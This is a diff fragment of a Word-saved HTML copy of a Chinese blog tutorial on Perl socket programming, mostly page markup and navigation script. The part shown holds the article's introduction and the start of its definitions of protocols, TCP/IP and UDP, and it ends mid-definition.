+  margin-left:36.0pt;text-indent:-18.0pt;line-height:16.5pt;mso-list:l0 lev=
+el2 lfo1;
+  tab-stops:list 72.0pt'><![if !supportLists]><span lang=3DEN-US
+  style=3D'font-size:10.0pt;mso-bidi-font-size:9.0pt;font-family:"Courier N=
+ew";
+  mso-fareast-font-family:"Courier New";color:#2A5200'><span style=3D'mso-l=
+ist:
+  Ignore'>o<span style=3D'font:7.0pt "Times New Roman"'>&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbs=
+p;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&=
+nbsp;&nbsp;&nbsp;
+  </span></span></span><![endif]><span lang=3DEN-US style=3D'font-size:9.0p=
+t;
+  font-family:Verdana;color:#2A5200'><a
+  href=3D"http://blog.chinaunix.net/u1/59865/article_78535.html"><span
+  class=3DHyperlink1><span style=3D'border:none'><span style=3D'border:none=
+'>&middot;
+  </span></span></span><span class=3DHyperlink1><span style=3D'font-family:=
+SimSun;
+  mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana;border:none'>=
+<span
+  style=3D'border:none'>&#25216;</span></span></span><span class=3DHyperlin=
+k1><span
+  style=3D'font-family:SimSun;mso-ascii-font-family:Verdana;mso-hansi-font-=
+family:
+  Verdana;border:none'><span style=3D'border:none'>&#26415;</span></span></=
+span><!-- a78535 --></a><!-- 78535 -->
+  <o:p></o:p></span></p>
+  <ul style=3D'margin-top:0cm' type=3Ddisc>
+   <li class=3DMsoNormal style=3D'color:#2A5200;mso-margin-bottom-alt:auto;
+       text-align:center;line-height:16.5pt;mso-list:l0 level1 lfo1;tab-sto=
+ps:
+       list 36.0pt'><span lang=3DEN-US style=3D'font-size:9.0pt;font-family=
+:Verdana'><a
+       href=3D"http://blog.chinaunix.net/u1/59865/index.html"><span
+       class=3DHyperlink1><span style=3D'font-family:SimSun;mso-ascii-font-=
+family:
+       Verdana;mso-hansi-font-family:Verdana;border:none'><span
+       style=3D'border:none'>&#39318;&#39029;</span></span></span></a> <o:p=
+></o:p></span></li>
+  </ul>
+  </td>
+  <td width=3D10 style=3D'width:7.2pt;padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+ </tr>
+</table>
+
+</div>
+
+<p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span lang=
+=3DEN-US><script language=3D"JavaScript">
+<!--
+
+function ShowHideDiv(divid,iImg){
+if($(divid).style.display =3D=3D "none"){
+iImg.src=3D"../../templates/newblue/images/dot2.gif";
+$(divid).style.display =3D "block";
+iImg.title=3D"??";
+}else{
+iImg.src=3D"../../templates/newblue/images/dot4.gif";
+$(divid).style.display =3D "none";
+iImg.title=3D"??";
+}
+}
+//navHover();
+if (window.attachEvent) window.attachEvent("onload", navHover);
+//-->
+</script><span style=3D'display:none;mso-hide:all'><o:p>&nbsp;</o:p></span>=
+</span></p>
+
+<div align=3Dcenter>
+
+<table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 wi=
+dth=3D950
+ style=3D'width:712.5pt;background:white;border-collapse:collapse;mso-paddi=
+ng-alt:
+ 0cm 0cm 0cm 0cm'>
+ <tr style=3D'mso-yfti-irow:0;height:7.5pt'>
+  <td colspan=3D7 style=3D'padding:0cm 0cm 0cm 0cm;height:7.5pt'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:8.0pt;mso-bidi=
+-font-size:
+  9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+ </tr>
+ <tr style=3D'mso-yfti-irow:1;mso-yfti-lastrow:yes'>
+  <td width=3D10 style=3D'width:7.5pt;padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+  <td width=3D235 valign=3Dtop style=3D'width:176.25pt;padding:0cm 0cm 0cm =
+0cm'
+  background=3D"Perl&#32593;&#32476;&#32534;&#31243;%20socket%20-%20perl%20=
+-%20mouse0301.files/bg_line.gif">
+  <div align=3Dcenter>
+  <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 =
+width=3D224
+   style=3D'width:168.0pt;border-collapse:collapse;WORD-WRAP: break-word'>
+   <tr style=3D'mso-yfti-irow:0;height:21.0pt'>
+    <td valign=3Dtop style=3D'padding:.75pt .75pt .75pt .75pt;height:21.0pt=
+'>
+    <div align=3Dcenter>
+    <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D=
+0 width=3D220
+     style=3D'width:165.0pt;border-collapse:collapse;mso-padding-alt:0cm 0c=
+m 0cm 0cm'
+     height=3D28>
+     <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+      <td width=3D115 style=3D'width:86.25pt;padding:0cm 0cm 0cm 0cm'>
+      <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><b><s=
+pan
+      style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-font=
+-family:
+      Verdana;color:#0066CC'>&#20851;&#20110;&#20316;&#32773;</span></b><sp=
+an
+      lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana;color:#0066=
+CC'><o:p></o:p></span></p>
+      </td>
+      <td width=3D105 style=3D'width:78.75pt;padding:0cm 0cm 0cm 0cm'>
+      <p class=3DMsoNormal align=3Dright style=3D'text-align:right'><span l=
+ang=3DEN-US
+      style=3D'font-size:9.0pt;font-family:Verdana;color:#0066CC'><img bord=
+er=3D0
+      width=3D18 height=3D18 id=3D"_x0000_i1028"
+      src=3D"file:///D:\Projects\TestTools\Tools\Perl\Doc\Perl&#32593;&#324=
+76;&#32534;&#31243;%20socket%20-%20perl%20-%20mouse0301.files\dot2.gif"
+      title=3D&#25910;&#36215;
+      onclick=3D"ShowHideDiv('aboutwriter',this);return false;">&nbsp;<o:p>=
+</o:p></span></p>
+      </td>
+     </tr>
+    </table>
+    </div>
+    <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span l=
+ang=3DEN-US
+    style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p></span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:1;height:3.75pt'>
+    <td style=3D'padding:.75pt .75pt .75pt .75pt;height:3.75pt'>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:4.0pt;mso-bi=
+di-font-size:
+    9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:2'>
+    <td style=3D'padding:.75pt .75pt .75pt .75pt'>
+    <div align=3Dcenter>
+    <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D=
+0 width=3D200
+     style=3D'width:150.0pt;border-collapse:collapse;mso-padding-alt:0cm 0c=
+m 0cm 0cm;
+     WORD-WRAP: break-word' id=3Daboutwriter>
+     <tr style=3D'mso-yfti-irow:0'>
+      <td style=3D'padding:0cm 0cm 0cm 0cm'>
+      <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span
+      lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana;color:#0236=
+8D'><a
+      href=3D"http://blog.chinaunix.net/u1/59865/" target=3D"_blank"><span
+      style=3D'text-decoration:none;text-underline:none'><img border=3D0 wi=
+dth=3D180
+      height=3D121 id=3D"_x0000_i1029"
+      src=3D"file:///D:\Projects\TestTools\Tools\Perl\Doc\Perl&#32593;&#324=
+76;&#32534;&#31243;%20socket%20-%20perl%20-%20mouse0301.files\up_user_pre.j=
+pg"></span></a><o:p></o:p></span></p>
+      </td>
+     </tr>
+     <tr style=3D'mso-yfti-irow:1;mso-yfti-lastrow:yes'>
+      <td width=3D200 style=3D'width:150.0pt;padding:0cm 0cm 0cm 0cm'>
+      <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font=
+-family:
+      Verdana;color:#02368D'><o:p>&nbsp;</o:p></span></p>
+      </td>
+     </tr>
+    </table>
+    </div>
+    <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span l=
+ang=3DEN-US
+    style=3D'font-size:9.0pt;font-family:Verdana;color:#02368D'><o:p></o:p>=
+</span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:3;mso-yfti-lastrow:yes;height:3.75pt'>
+    <td style=3D'padding:.75pt .75pt .75pt .75pt;height:3.75pt'>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:4.0pt;mso-bi=
+di-font-size:
+    9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+    </td>
+   </tr>
+  </table>
+  </div>
+  <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span lan=
+g=3DEN-US
+  style=3D'font-size:9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+  <div align=3Dcenter>
+  <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 =
+width=3D220
+   style=3D'width:165.0pt;border-collapse:collapse;mso-padding-alt:0cm 0cm =
+0cm 0cm'>
+   <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+    <td style=3D'padding:0cm 0cm 0cm 0cm'>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-f=
+amily:
+    Verdana'><o:p>&nbsp;</o:p></span></p>
+    </td>
+   </tr>
+  </table>
+  </div>
+  <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span lan=
+g=3DEN-US
+  style=3D'font-size:9.0pt;font-family:Verdana;display:none;mso-hide:all'><=
+o:p>&nbsp;</o:p></span></p>
+  <div align=3Dcenter>
+  <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 =
+width=3D224
+   style=3D'width:168.0pt;background:white;border-collapse:collapse' height=
+=3D28>
+   <tr style=3D'mso-yfti-irow:0;height:21.0pt'>
+    <td valign=3Dtop style=3D'padding:.75pt .75pt .75pt .75pt;height:21.0pt'
+    background=3D"Perl&#32593;&#32476;&#32534;&#31243;%20socket%20-%20perl%=
+20-%20mouse0301.files/bg_line.gif">
+    <div align=3Dcenter>
+    <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D=
+0 width=3D220
+     style=3D'width:165.0pt;border-collapse:collapse;mso-padding-alt:0cm 0c=
+m 0cm 0cm'>
+     <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+      <td width=3D115 style=3D'width:86.25pt;padding:0cm 0cm 0cm 0cm'>
+      <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><b><s=
+pan
+      style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-font=
+-family:
+      Verdana;color:#0066CC'>&#25105;&#30340;&#20998;&#31867;</span></b><sp=
+an
+      lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana;color:#0066=
+CC'><o:p></o:p></span></p>
+      </td>
+      <td width=3D105 style=3D'width:78.75pt;padding:0cm 0cm 0cm 0cm'>
+      <p class=3DMsoNormal align=3Dright style=3D'text-align:right'><span l=
+ang=3DEN-US
+      style=3D'font-size:9.0pt;font-family:Verdana;color:#0066CC'><img bord=
+er=3D0
+      width=3D18 height=3D18 id=3D"_x0000_i1030"
+      src=3D"file:///D:\Projects\TestTools\Tools\Perl\Doc\Perl&#32593;&#324=
+76;&#32534;&#31243;%20socket%20-%20perl%20-%20mouse0301.files\dot2.gif"
+      title=3D&#25910;&#36215;
+      onclick=3D"ShowHideDiv('lefttree',this);return false;">&nbsp;<o:p></o=
+:p></span></p>
+      </td>
+     </tr>
+    </table>
+    </div>
+    <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span l=
+ang=3DEN-US
+    style=3D'font-size:9.0pt;font-family:Verdana'><o:p></o:p></span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:1;height:3.75pt'>
+    <td style=3D'padding:.75pt .75pt .75pt .75pt;height:3.75pt'>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:4.0pt;mso-bi=
+di-font-size:
+    9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:2'>
+    <td style=3D'padding:.75pt .75pt .75pt .75pt'>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-f=
+amily:
+    Verdana'><script  src=3D"Perl???? socket - perl - mouse0301.files/tree.=
+js">
+    </script><script language=3D"JavaScript">
+ContentsTree =3D new CTree("ContentsTree");
+ContentsTree.bAutoClose =3D false;
+ContentsTree.stTarget =3D "";
+a0 =3D ContentsTree.AddNode(null, "??????", "article.html");
+a0.bOpen=3Dtrue;
+p0 =3D ContentsTree.AddNode(null, "??????", "photo.html");
+p0.bOpen=3Dtrue;
+f0 =3D ContentsTree.AddNode(null, "??????", "links.html");
+f0.bOpen=3Dtrue;
+m0 =3D ContentsTree.AddNode(null, "??????", "music.html");
+m0.bOpen=3Dtrue;
+a78528 =3D ContentsTree.AddNode(a0, "perl", "article_78528.html");
+a78528.bOpen=3Dtrue;
+var pm=3Da78528;
+while(pm=3Dpm.pParent){
+pm.bOpen=3Dtrue;
+}
+a78534 =3D ContentsTree.AddNode(a0, "shell", "article_78534.html");
+a78535 =3D ContentsTree.AddNode(a0, "??", "article_78535.html");
+ 
+ 
+ 
+ 
+//document.write(ContentsTree.GetHTMLCode());
+document.getElementById("lefttree").innerHTML=3DContentsTree.GetHTMLCode();
+    </script><o:p></o:p></span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:3;mso-yfti-lastrow:yes;height:3.75pt'>
+    <td style=3D'padding:.75pt .75pt .75pt .75pt;height:3.75pt'>
+    <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:4.0pt;mso-bi=
+di-font-size:
+    9.0pt;font-family:Verdana'><o:p>&nbsp;</o:p></span></p>
+    </td>
+   </tr>
+  </table>
+  </div>
+  <p class=3DMsoNormal align=3Dcenter style=3D'margin-bottom:12.0pt;text-al=
+ign:center'><span
+  lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'><br>
+  <a href=3D"http://blog.chinaunix.net/u1/rss.php?id=3D59865"><span
+  style=3D'text-decoration:none;text-underline:none'><img border=3D0 width=
+=3D80
+  height=3D15 id=3D"_x0000_i1033"
+  src=3D"file:///D:\Projects\TestTools\Tools\Perl\Doc\Perl&#32593;&#32476;&=
+#32534;&#31243;%20socket%20-%20perl%20-%20mouse0301.files\xmlrss.gif"></spa=
+n></a><o:p></o:p></span></p>
+  </td>
+  <td width=3D10 style=3D'width:7.5pt;padding:0cm 0cm 0cm 0cm'>
+  <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;font-fam=
+ily:Verdana'><o:p>&nbsp;</o:p></span></p>
+  </td>
+  <td width=3D685 valign=3Dtop style=3D'width:513.75pt;padding:0cm 0cm 0cm =
+0cm'>
+  <div align=3Dcenter>
+  <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=3D0 =
+width=3D"100%"
+   style=3D'width:100.0%;border-collapse:collapse;mso-padding-alt:0cm 0cm 0=
+cm 0cm'>
+   <tr style=3D'mso-yfti-irow:0'>
+    <td style=3D'background:#BBF0FF;padding:0cm 0cm 0cm 0cm'>
+    <p class=3DMsoNormal align=3Dcenter style=3D'text-align:center'><span l=
+ang=3DEN-US
+    style=3D'font-size:9.0pt;font-family:Verdana'><br>
+    </span><b><span lang=3DEN-US style=3D'font-size:14.0pt;font-family:Verd=
+ana;
+    color:#000066'>Perl</span></b><b><span style=3D'font-size:14.0pt;mso-as=
+cii-font-family:
+    Verdana;mso-hansi-font-family:Verdana;color:#000066'>&#32593;&#32476;&#=
+32534;&#31243;</span></b><b><span
+    lang=3DEN-US style=3D'font-size:14.0pt;font-family:Verdana;color:#00006=
+6'>
+    socket</span></b><span lang=3DEN-US style=3D'font-size:9.0pt;font-famil=
+y:Verdana'>
+    <o:p></o:p></span></p>
+    </td>
+   </tr>
+   <tr style=3D'mso-yfti-irow:1;mso-yfti-lastrow:yes'>
+    <td style=3D'padding:0cm 0cm 0cm 0cm'>
+    <table class=3DMsoNormalTable border=3D1 cellspacing=3D0 cellpadding=3D0
+     width=3D"100%" style=3D'width:100.0%;border-collapse:collapse;border:n=
+one;
+     mso-border-alt:outset #BBF0FF .75pt;mso-padding-alt:0cm 0cm 0cm 0cm;
+     WORD-WRAP: break-word'>
+     <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+      <td style=3D'border:inset #BBF0FF 1.0pt;mso-border-alt:inset #BBF0FF =
+.75pt;
+      padding:0cm 0cm 0cm 0cm'>
+      <div align=3Dcenter>
+      <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpadding=
+=3D0
+       width=3D650 style=3D'width:487.5pt;border-collapse:collapse;mso-padd=
+ing-alt:
+       0cm 0cm 0cm 0cm;WORD-WRAP: break-word'>
+       <tr style=3D'mso-yfti-irow:0'>
+        <td style=3D'padding:0cm 0cm 0cm 0cm'>
+        <div align=3Dcenter>
+        <table class=3DMsoNormalTable border=3D0 cellspacing=3D0 cellpaddin=
+g=3D0
+         width=3D"100%" style=3D'width:100.0%;border-collapse:collapse;mso-=
+padding-alt:
+         0cm 0cm 0cm 0cm'>
+         <tr style=3D'mso-yfti-irow:0;mso-yfti-lastrow:yes'>
+          <td width=3D650 style=3D'width:487.5pt;padding:0cm 0cm 0cm 0cm'>
+          <div style=3D'margin-left:11.25pt;margin-top:11.25pt;margin-right=
+:11.25pt;
+          margin-bottom:11.25pt' id=3Dart>
+          <div>
+          <div>
+          <p class=3DMsoNormal><span lang=3DEN-US style=3D'font-size:9.0pt;
+          font-family:Verdana'>Perl</span><span style=3D'font-size:9.0pt;
+          mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#32=
+593;&#32476;&#32534;&#31243;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          <br>
+          Perl</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:V=
+erdana;
+          mso-hansi-font-family:Verdana'>&#24456;&#24378;&#22823;&#65292;&#=
+19981;&#20165;&#33021;&#24320;&#21457;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>CGI</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#26041;&#38754;&#30340;&#31243;&#24207;&#65292;&#36824;=
+&#21487;&#20197;&#29992;&#23427;&#36827;&#34892;&#32593;&#32476;&#31243;&#2=
+4207;&#30340;&#24320;&#21457;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20351;&#32593;&#32476;&#32534;&#31243;&#26356;&#31616;=
+&#21333;&#65292;&#24320;&#21457;&#36895;&#24230;&#26356;&#24555;&#12290;&#3=
+0446;&#21069;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#24212;&#29992;&#33539;&#22260;&#38500;&#20102;&#31995;=
+&#32479;&#32500;&#25252;&#65292;&#31243;&#24207;&#36816;&#34892;&#26102;&#3=
+7197;&#32622;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>CGI</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65288;&#29616;&#22312;&#24212;&#29992;&#30340;&#24456;=
+&#23569;&#20102;&#65289;&#65292;&#20415;&#26159;&#29992;&#26469;&#36827;&#3=
+4892;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>hacker=
+</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#33050;&#26412;&#30340;&#32534;&#20889;&#12290;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#33050;&#26412;&#30340;&#29305;&#28857;&#26159;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> &#822=
+0;</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31616;&#32451;&#32780;&#24378;&#22823;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>&#8221=
+;</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65292;&#38750;&#24120;&#36866;&#21512;&#20889;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Exploi=
+t</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#12290;&#22312;&#32593;&#32476;&#19978;&#21487;&#20197;=
+&#25214;&#21040;&#24456;&#22810;&#22269;&#22806;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>hacker=
+</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#29992;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'>Perl</span><span style=3D'font-size:9.0pt;
+          mso-ascii-font-family:Verdana;mso-hansi-font-family:Verdana'>&#20=
+889;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Exploi=
+t</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31243;&#24207;&#65292;&#32780;&#22312;&#22269;&#20869;=
+&#23601;&#23569;&#20102;&#24456;&#22810;&#12290;&#30001;&#20110;&#22823;&#3=
+7096;&#20998;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Exploi=
+t</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#31243;&#24207;&#37117;&#26159;&#32593;&#32476;&#26041;=
+&#38754;&#30340;&#31243;&#24207;&#65292;&#22240;&#27492;&#26412;&#25991;&#2=
+3558;&#20171;&#32461;&#22914;&#20309;&#20351;&#29992;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#36827;&#34892;&#32593;&#32476;&#32534;&#31243;&#65292;=
+&#36890;&#36807;&#19968;&#20123;&#23567;&#30340;&#20363;&#23376;&#26469;&#3=
+5753;&#22823;&#23478;&#29087;&#24713;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#30340;&#32593;&#32476;&#32534;&#31243;&#12290;&#26412;=
+&#25991;&#19981;&#20250;&#28041;&#21450;&#21040;&#20855;&#20307;&#28431;&#2=
+7934;&#21033;&#29992;&#30340;&#33050;&#26412;&#65292;&#21482;&#26159;&#2522=
+6;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Perl</=
+span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#32593;&#32476;&#32534;&#31243;&#30340;&#19968;&#20123;=
+&#22522;&#26412;&#27010;&#24565;&#20171;&#32461;&#32473;&#22823;&#23478;&#1=
+2290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#24076;&#26395;&#22823;&#23478;&#=
+33021;&#20174;&#26412;&#25991;&#20013;&#24471;&#21040;&#19968;&#20123;&#247=
+44;&#38656;&#35201;&#30340;&#30693;&#35782;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#26412;&#25991;&#30340;&#32422;&#=
+23450;&#65306;&#20351;&#29992;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IP</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#22320;&#22336;&#20026;&#26412;&#22320;&#22320;&#22336;=
+&#65292;&#25152;&#26377;&#31243;&#24207;&#22343;&#22312;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>Active=
+Perl5.61</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#29256;&#27979;&#35797;&#36890;&#36807;&#12290;</span><=
+span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#26412;&#22320;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>IP</sp=
+an><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#65306;</span><span lang=3DEN-US style=3D'font-size:9.0=
+pt;
+          font-family:Verdana'>127.0.0.1 <br>
+          <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#19968;&#12289;</span><span
+          style=3D'font-size:9.0pt;font-family:Verdana'> </span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#20960;&#20010;&#32593;&#32476;&#26041;&#38754;&#30340;=
+&#22522;&#26412;&#27010;&#24565;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#26412;&#25991;&#20027;&#35201;&#=
+38024;&#23545;&#21021;&#23398;&#32773;&#65292;&#25152;&#20197;&#26412;&#259=
+91;&#22312;&#27010;&#24565;&#20171;&#32461;&#19978;&#20063;&#23558;&#23613;=
+&#37327;&#20351;&#35821;&#35328;&#25551;&#36848;&#30340;&#36890;&#20439;&#2=
+6131;&#25026;&#65292;&#26412;&#25991;&#21518;&#38754;&#35201;&#28041;&#2145=
+0;&#21040;&#30340;&#20960;&#20010;&#32593;&#32476;&#26041;&#38754;&#30340;&=
+#22522;&#26412;&#27010;&#24565;&#22914;&#19979;&#65306;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          </span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Verda=
+na;
+          mso-hansi-font-family:Verdana'>&#21327;&#35758;&#65306;&#25152;&#=
+35859;&#30340;&#21327;&#35758;&#23601;&#26159;&#23545;&#36827;&#34892;&#368=
+90;&#35759;&#20256;&#36755;&#30340;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>2</spa=
+n><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21488;&#35745;&#31639;&#26426;&#20043;&#38388;&#30340;=
+&#24212;&#35813;&#20849;&#21516;&#36981;&#23432;&#30340;&#19968;&#20010;&#3=
+4892;&#20026;&#20934;&#21017;&#25110;&#31216;&#34892;&#20026;&#35268;&#3353=
+9;&#12290;</span><span
+          style=3D'font-size:9.0pt;font-family:Verdana'> <span lang=3DEN-US=
+><br>
+          TCP/IP</span></span><span style=3D'font-size:9.0pt;mso-ascii-font=
+-family:
+          Verdana;mso-hansi-font-family:Verdana'>&#21327;&#35758;&#65306;&#=
+26159;&#23450;&#20041;&#20102;&#32593;&#32476;&#20256;&#36755;&#30340;&#199=
+68;&#20010;&#21327;&#35758;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'> <br>
+          UDP</span><span style=3D'font-size:9.0pt;mso-ascii-font-family:Ve=
+rdana;
+          mso-hansi-font-family:Verdana'>&#65306;&#29992;&#25143;&#25968;&#=
+25454;&#25253;&#21327;&#35758;&#12290;</span><span
+          lang=3DEN-US style=3D'font-size:9.0pt;font-family:Verdana'>UDP</s=
+pan><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
+          Verdana'>&#21327;&#35758;&#26159;</span><span lang=3DEN-US
+          style=3D'font-size:9.0pt;font-family:Verdana'>TCP/IP</span><span
+          style=3D'font-size:9.0pt;mso-ascii-font-family:Verdana;mso-hansi-=
+font-family:
